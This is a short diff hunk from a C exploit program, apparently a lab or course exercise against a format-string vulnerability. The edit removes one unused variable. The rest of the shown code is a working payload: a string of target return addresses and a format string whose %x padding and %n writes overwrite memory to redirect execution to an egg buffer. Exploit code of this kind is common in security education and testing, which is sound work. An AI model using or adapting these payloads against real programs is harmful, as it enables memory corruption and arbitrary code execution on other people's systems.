@@ -12,7 +12,6 @@ int main(void)
   char *args[3];
   char *env[1];
   char egg[EGG_SIZE];
-  char *popStack = "%x%x%x";
   char *dummyAddrPair = "\xff\xff\xff\xff\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf";
   char *writeStr = "%x%x%x%250x%n%164x%n%259x%n%192x%n";
 
